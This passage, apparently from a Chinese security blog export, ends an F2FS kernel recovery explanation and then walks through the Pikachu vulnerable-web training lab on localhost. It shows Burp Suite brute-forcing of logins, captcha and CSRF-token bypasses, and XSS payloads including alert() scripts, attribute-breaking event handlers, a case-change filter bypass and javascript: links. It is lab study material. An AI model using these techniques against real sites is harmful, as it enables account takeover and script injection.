next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行恢复</span></span><br><span class="line">        do_recover_data(sbi, entry-&gt;inode, page, blkaddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;blkaddr == blkaddr) &#123;</span><br><span class="line">            iput(entry-&gt;inode);</span><br><span class="line">            list_del(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">            kmem_cache_free(fsync_entry_slab, entry);</span><br><span class="line">        &#125;</span><br><span class="line">next:</span><br><span class="line">        <span class="comment">/* check next segment */</span></span><br><span class="line">        blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">        ClearPageUptodate(page);</span><br><span class="line">        &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    allocate_new_segments(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-fsync-data-恢复fsync数据"><a href="#recover-fsync-data-恢复fsync数据" class="headerlink" title="recover_fsync_data // 恢复fsync数据"></a>recover_fsync_data // 恢复fsync数据</h3><p>①首先通过<code>find_fsync_dnodes</code>函数找到所有的可以恢复的dnode对应的inode(有可能dnode就是inode本身)，放入到一个list中。  </p>
<blockquote>
<p><code>find_fsync_dnodes</code>的执行流程：通过调用<code>CURSEG_I</code>和<code>START_BLOCK</code>函数获取当前段（segment）的node pages，再调用alloc_page读取node pages，把可恢复的dnode对应的inode添加到list中，再检查下个段（segment）。  </p>
</blockquote>
<p>②恢复数据：恢复inode list里面的所有的node page</p>
]]></content>
      <categories>
        <category>内核</category>
      </categories>
      <tags>
        <tag>F2FS</tag>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu RECORD</title>
    <url>/2021/06/07/pikachuRecord/</url>
    <content><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><h3 id="pikachu平台搭建"><a href="#pikachu平台搭建" class="headerlink" title="pikachu平台搭建"></a>pikachu平台搭建</h3><p><a href="https://woopokyuk.github.io/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/">https://woopokyuk.github.io/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/</a></p>
<h3 id="BurpSuite-抓本地包的方法"><a href="#BurpSuite-抓本地包的方法" class="headerlink" title="BurpSuite 抓本地包的方法"></a>BurpSuite 抓本地包的方法</h3><p><a href="[关于Burp Suite不能拦截localhost,127.0.0.1的问题_我%@&amp;的博客-CSDN博客_burp无法拦截本地](https://blog.csdn.net/weixin_45396639/article/details/104379312">参考</a>)</p>
<ul>
<li>核心是设置浏览器允许本地（localhost 127.0.0.1）使用代理</li>
</ul>
<h4 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h4><ul>
<li>我这里用 SwitchyOmega 插件来管理代理设置，原先设置的Burpsuite代理，默认是不代理本地主机的</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607114930145.png" alt="image-20210607114930145"></p>
<ul>
<li>需要将不代理地址列表清空</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607115005856.png" alt="image-20210607115005856"></p>
<h4 id="允许劫持localhost"><a href="#允许劫持localhost" class="headerlink" title="允许劫持localhost"></a>允许劫持localhost</h4><ul>
<li><p>火狐浏览器搜索 <code>about:config</code></p>
</li>
<li><p>搜索首选项名称 <code>network.proxy.allow_hijacking_localhost</code></p>
</li>
<li>将 false 改为 true<ul>
<li>注意：当需要Bp获取请求包时，再将 config 改为 true（如点击登录按钮等）</li>
</ul>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607122844889.png" alt="image-20210607122844889"></p>
<h2 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1 暴力破解"></a>1 暴力破解</h2><h3 id="1-1-基于表单的暴力破解"><a href="#1-1-基于表单的暴力破解" class="headerlink" title="1.1 基于表单的暴力破解"></a>1.1 基于表单的暴力破解</h3><ul>
<li>打开Bp，先进入登录页，任意输入用户名及口令，更换为本地代理，然后将 network.proxy.allow_hijacking_localhost 改为 true，点击 Login</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607123202666.png" alt="image-20210607123202666" style="zoom:67%;"></p>
<ul>
<li>获取请求，CTRL + I 发送至 Intruder 模块，添加变量，攻击类型改为 Cluster bomb。并分别为用户名密码设置 payload，设置线程（这里设为 50）    </li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607123403675.png" alt="image-20210607123403675"></p>
<ul>
<li>start attack，根据响应包长度找到两个成功登录的用户名及口令，Done！</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607123835691.png" alt="image-20210607123835691"></p>
<h3 id="1-2-验证码绕过-on-server"><a href="#1-2-验证码绕过-on-server" class="headerlink" title="1.2 验证码绕过(on server)"></a>1.2 验证码绕过(on server)</h3><p><img src="/2021/06/07/pikachuRecord/image-20210607144107445.png" alt="image-20210607144107445" style="zoom:67%;"></p>
<ul>
<li>打开 Bp，在输入框中填写任意用户名和口令，然后输入相应的验证码，选择本地代理并将 network.proxy.allow_hijacking_localhost 改为 true，用 Bp 截获请求。CTRL + R 发送到 Repeater，Go，试试验证码</li>
<li>当我们输入页面显示的验证码会提示，用户名或密码不存在</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607144054121.png" alt="image-20210607144054121"></p>
<ul>
<li>任意修改用户名及密码，都会得到这个提示，而修改验证码则会提示</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607144214033.png" alt="image-20210607144214033"></p>
<ul>
<li>因此得到结论：后台并不会刷新验证，我们得到的验证码持续有效，因此 CTRL + I 发送到 Intruder 模块进行爆破。</li>
<li>与上文同理可得两个账号</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607144425800.png" alt="image-20210607144425800"></p>
<h3 id="1-3-验证码绕过-on-client"><a href="#1-3-验证码绕过-on-client" class="headerlink" title="1.3 验证码绕过(on client)"></a>1.3 验证码绕过(on client)</h3><p><img src="/2021/06/07/pikachuRecord/image-20210607150116727.png" alt="image-20210607150116727" style="zoom: 67%;"></p>
<ul>
<li>操作步骤同上一节服务端绕过</li>
<li>与之不同之处，从 Repeater 开始，本次实验即使输错验证码，甚至删除验证码参数都不会提示验证码错误或验证码为空，均提示</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607150404787.png" alt="image-20210607150404787"></p>
<ul>
<li><p>在响应中可以看到，验证码生成与验证是通过前端 JS 实现，只有在前端通过网页登录才会进行验证。用 Bp 直接 POST 参数，是不会进行验证的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createCode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.className = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).value;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            alert(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            createCode();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除验证码参数，或使用任意验证码按上一节同样的方式进行爆破即可，Done！</p>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607145749921.png" alt="image-20210607145749921" style="zoom:67%;"> </p>
<h3 id="1-4-token防爆破"><a href="#1-4-token防爆破" class="headerlink" title="1.4 token防爆破?"></a>1.4 token防爆破?</h3><h4 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h4><ul>
<li><p><a href="https://www.jianshu.com/p/24825a2683e6"><strong>什么是 Token：</strong></a> 第一次登录后，服务器生成一个 Token 并返回给客户端，客户端需要带着这个 Token请求数据</p>
</li>
<li><p>使用相同的 token POST 数据会提示 csrf token error </p>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607161120581.png" alt="image-20210607161120581"></p>
<ul>
<li>重新获取一个新的 token （重来一次）</li>
</ul>
<hr>
<p><strong><a href="https://blog.csdn.net/qq_38632151/article/details/102600053">BurpSuite Intruder模块的四种攻击类型</a></strong></p>
<ul>
<li>Sniper：（一个 payload）根据字典中数据，依次对标记的变量进行替换。相当于将标记的 n 个变量当作一整块，每次从字典中拿出 n 个数据依次分给这 n 个变量，直到字典用尽。</li>
<li>Battering Ram: （一个 payload）被标记的 n 个变量的变化是同步的。从字典中取出的一个数据会被同步给到这 n 个变量。</li>
<li>Pitchfork: （多个 payload）交叉替换，比如 n 个变量，会对应有 n 个 payload，每个变量的取值只能从它自己的 payload 中获得，当最少 payload 被遍历完，整个攻击过程就结束。</li>
<li>Cluster bomb: （多个 payload）n 个变量就是O(N^n) 的穷举。</li>
</ul>
<hr>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul>
<li>前面的步骤跟上文同理，直到发送到 Intruder</li>
<li>由于 Token 需要从上一次响应中取值，所以攻击类型和线程是需要注意的。攻击类型需为 Pitchfork 交叉替换，线程数只能为 1</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174112388.png" alt="image-20210607174112388"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174059309.png" alt="image-20210607174059309"></p>
<ul>
<li>因为交叉替换会同步遍历 payload，所以如果标记用户名、口令、token 三个变量，那有可能可登录的账号密码不能被遍历到，所以这里的实验只标记了口令和 token，用户名直接猜测是 admin</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607173823435.png" alt="image-20210607173823435"></p>
<ul>
<li>payload 1 选择口令字典；payload 2 由于需要从上一个响应中获取，所以选择 Recursive grep 通过递归搜索</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174135371.png" alt="image-20210607174135371"></p>
<ul>
<li>Options 中需要添加数据提取</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174304560.png" alt="image-20210607174304560"></p>
<ul>
<li>点击 Refetch response，搜索 token 选中后点击 ok</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174356418.png" alt="image-20210607174356418"></p>
<ul>
<li>start attack, Done!</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174606081.png" alt="image-20210607174606081"></p>
<h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2 XSS"></a>2 XSS</h2><h3 id="先验知识-1"><a href="#先验知识-1" class="headerlink" title="先验知识"></a>先验知识</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>反射型，存储型，DOM 型</p>
<h4 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h4><ul>
<li>输入过滤</li>
<li>输出转义</li>
</ul>
<h3 id="2-1-反射型xss-get"><a href="#2-1-反射型xss-get" class="headerlink" title="2.1 反射型xss(get)"></a>2.1 反射型xss(get)</h3><ul>
<li>任意输入，发现 GET 参数 message 在变。也可 F12 查看元素得到这个信息</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607201133554.png" alt="image-20210607201133554" style="zoom: 67%;"></p>
<ul>
<li>由于有长度限制，所以直接在 URL 中进行修改使 message 为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&amp;submit=submit#</span><br></pre></td></tr></table></figure>
<ul>
<li>页面弹窗，DONE!</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607201441646.png" alt="image-20210607201441646" style="zoom:67%;"></p>
<h3 id="2-2-反射性xss-post"><a href="#2-2-反射性xss-post" class="headerlink" title="2.2 反射性xss(post)"></a>2.2 反射性xss(post)</h3><ul>
<li><p>需要登录，所以先进行弱口令爆破</p>
</li>
<li><p>易得</p>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607202353673.png" alt="image-20210607202353673" style="zoom:67%;"></p>
<ul>
<li><code>admin/123456</code> 登录进去，直接在输入框中输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，即刻弹窗</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607202851131.png" alt="image-20210607202851131" style="zoom:67%;"></p>
<ul>
<li>在 BurpSutie 中修改 POST 请求体的内容再 Foward 道理是一样的。Done!</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607203107776.png" alt="image-20210607203107776" style="zoom:80%;"></p>
<h3 id="2-3-存储型xss"><a href="#2-3-存储型xss" class="headerlink" title="2.3 存储型xss"></a>2.3 存储型xss</h3><p>与反射型 XSS 不同，存储型 XSS 会被存储到服务器，是持久型的。也就是说只要成功注入 XSS，用户每次访问都会有效（XSS）</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210607203307990.png" alt="image-20210607203307990" style="zoom:80%;"></p>
<ul>
<li>在留言框，留言<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607203354310.png" alt="image-20210607203354310"></p>
<h3 id="2-4-DOM型xss"><a href="#2-4-DOM型xss" class="headerlink" title="2.4 DOM型xss"></a>2.4 DOM型xss</h3><h4 id="2-4-1-什么是-DOM"><a href="#2-4-1-什么是-DOM" class="headerlink" title="2.4.1 什么是 DOM"></a>2.4.1 什么是 DOM</h4><p><a href="https://www.w3school.com.cn/htmldom/index.asp">参考 HTML DOM</a> </p>
<p>Document Object Model（文档对象模型）将 HTML 文档表达为树结构。它定义了所有 HTML 元素的对象和属性，以及访问它们的方法。通过 HTML DOM，树中的所有节点均可通过 JavaScript 的一些 API 进行访问，所有 HTML 元素均可被修改，也可以创建或删除节点。</p>
<p><a href="https://www.w3school.com.cn/htmldom/dom_methods.asp">HTML DOM 方法 (w3school.com.cn)</a></p>
<h4 id="2-4-2-具体步骤"><a href="#2-4-2-具体步骤" class="headerlink" title="2.4.2 具体步骤"></a>2.4.2 具体步骤</h4><ul>
<li>点击按钮，显示 “what do you see?” 的链接，这个链接指向的就是当前当前页</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607210035764.png" alt="image-20210607210035764" style="zoom:80%;"></p>
<ul>
<li>F12 找到这个元素</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607210703950.png" alt="image-20210607210703950"></p>
<ul>
<li>所以，我们在输入框输入的数据会通过 DOM 方法 <code>getElementById()</code> 获取到并初始化 str，第二个 <code>getElementById(&quot;dom&quot;)</code> 则会找到 dom 元素，并通过 innerHTML 属性获取元素内容。这样的话，我们可以通过对输出值的修改闭合前面的单引号然后注入。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>原来的 dom 节点就会被修改为</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607211555195.png" alt="image-20210607211555195"></p>
<ul>
<li>只要鼠标在图片上放移动，就会触发 XSS</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607211922958.png" alt="image-20210607211922958" style="zoom:80%;"></p>
<h4 id="2-4-3-拓展"><a href="#2-4-3-拓展" class="headerlink" title="2.4.3 拓展"></a>2.4.3 拓展</h4><ul>
<li>为了加深理解，我们可以自己闭合标签后，在页面新增输入框等元素</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;input id=&quot;hh&quot; name=&quot;hh&quot; type=&quot;text&quot; value&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210607212408963.png" alt="image-20210607212408963" style="zoom:80%;"></p>
<ul>
<li>新增按钮</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;input id=&quot;hh&quot; name=&quot;hh&quot; type=&quot;button&quot; value=&quot;hh&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210607212537663.png" alt="image-20210607212537663" style="zoom:80%;"></p>
<h3 id="2-5-DOM型xss-x"><a href="#2-5-DOM型xss-x" class="headerlink" title="2.5 DOM型xss-x"></a>2.5 DOM型xss-x</h3><ul>
<li>点击按钮后出现一个超链接</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607233707959.png" alt="image-20210607233707959" style="zoom:80%;"></p>
<ul>
<li>点击该链接，发现 dom 节点</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607233836115.png" alt="image-20210607233836115" style="zoom:80%;"></p>
<ul>
<li>再往前看看源码，所以首先会从输入框获取字符串，然后以 “text=” 进行分割后，选第二个元素；再将这个元素中的加号换成空格，然后再送给 <code>getElementById</code> 处理。</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607233913956.png" alt="image-20210607233913956"></p>
<ul>
<li>可以输入字符串后，直接在浏览器控制台跑一下代码，看看其变化</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">&#x27;</span> onclick=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210607234252072.png" alt="image-20210607234252072"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210607234312425.png" alt="image-20210607234312425"></p>
<ul>
<li>所以道理是一样的，只不过受影响的节点是点击按钮后的第二条链接处</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607234438728.png" alt="image-20210607234438728" style="zoom:80%;"></p>
<ul>
<li>DONE!</li>
</ul>
<h3 id="2-6-xss盲打"><a href="#2-6-xss盲打" class="headerlink" title="2.6 xss盲打"></a>2.6 xss盲打</h3><p>核心就是<strong>尝试</strong></p>
<ul>
<li>提示登录后台 <a href="http://localhost:8081/pikachu/vul/xss/xssblind/admin_login.php">http://localhost:8081/pikachu/vul/xss/xssblind/admin_login.php</a></li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210608234642882.png" alt="image-20210608234642882" style="zoom:80%;"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210608234739069.png" alt="image-20210608234739069" style="zoom:80%;"></p>
<ul>
<li>弱口令爆破可以得到 admin/123456，进入后台可以看到已有的留言</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210608234837073.png" alt="image-20210608234837073" style="zoom:80%;"></p>
<ul>
<li>尝试在留言框写入</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>管理员重新进入后台时，就会触发 xss</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210608235226651.png" alt="image-20210608235226651"></p>
<hr>
<p>当然姓名框也可以进行 xss</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210608235355873.png" alt="image-20210608235355873"></p>
<hr>
<h3 id="2-7-xss之过滤"><a href="#2-7-xss之过滤" class="headerlink" title="2.7 xss之过滤"></a>2.7 xss之过滤</h3><ul>
<li>大小写绕过</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-8-xss之htmlspecialchars"><a href="#2-8-xss之htmlspecialchars" class="headerlink" title="2.8 xss之htmlspecialchars"></a>2.8 xss之htmlspecialchars</h3><h4 id="2-8-1-htmlspecialchars"><a href="#2-8-1-htmlspecialchars" class="headerlink" title="2.8.1 htmlspecialchars"></a>2.8.1 htmlspecialchars</h4><p><a href="https://www.php.net/htmlspecialchars/">PHP: htmlspecialchars - Manual</a></p>
<ul>
<li><code>&amp;</code> (&amp; 符号) <code>&amp;amp;</code></li>
<li><code>&quot;</code> (双引号) <code>&amp;quot;</code>，除非设置了 ENT_NOQUOTES</li>
<li><code>&#39;</code> (单引号) 设置了 ENT_QUOTES 后进行转换：<ul>
<li><code>#039;</code> (如果是 ENT_HTML401) ，或者</li>
<li><code>&amp;apos;</code> (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。</li>
</ul>
</li>
<li><code>&lt;</code> (小于)成为 <code>&amp;lt;</code></li>
<li><code>&gt;</code> (大于)成为 <code>&amp;gt;</code></li>
</ul>
<h4 id="2-8-2-具体步骤"><a href="#2-8-2-具体步骤" class="headerlink" title="2.8.2 具体步骤"></a>2.8.2 具体步骤</h4><p><img src="/2021/06/07/pikachuRecord/image-20210609222240442.png" alt="image-20210609222240442" style="zoom: 80%;"></p>
<ul>
<li>输入测试代码 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 后，查看源码，发现 <code>&lt;&gt;</code> 被替换掉了</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&#x27;notice&#x27;</span>&gt;</span>你的输入已经被记录:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>输入单引号进行测试</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">p class=&#x27;notice&#x27;&gt;你的输入已经被记录:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&#x27;&gt;</span>&#x27;<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>所以可以通过只是用单引号的方法注入，成功</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">&#x27;</span> onmouseover=<span class="string">&#x27;alert(1)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210609223539074.png" alt="image-20210609223539074" style="zoom:80%;"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210609223629192.png" alt="image-20210609223629192" style="zoom:80%;"></p>
<ul>
<li>查看源码，这段代码是完成注入的</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210609223735459.png" alt="image-20210609223735459"></p>
<h3 id="2-9-xss之href输出"><a href="#2-9-xss之href输出" class="headerlink" title="2.9 xss之href输出"></a>2.9 xss之href输出</h3><ul>
<li>输入测试</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&amp;<span class="string">&quot;&#x27;&lt;&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查看网页源码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;<span class="symbol">&amp;amp;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;#039;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>都被转换过了，所以尝试 JavaScript 伪协议 <a href="https://www.cnblogs.com/mingqi-420/p/11022505.html">参考</a></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>查看一下源码，成功注入</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210609230835988.png" alt="image-20210609230835988" style="zoom:80%;"></p>
<ul>
<li>点击链接，即可触发 XSS</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210609230740761.png" alt="image-20210609230740761" style="zoom:80%;"></p>
<h3 id="2-10-xss之js输出"><a href="#2-10-xss之js输出" class="headerlink" title="2.10 xss之js输出"></a>2.10 xss之js输出</h3><ul>
<li>随便输入个 123 查看源码</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>($ms.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
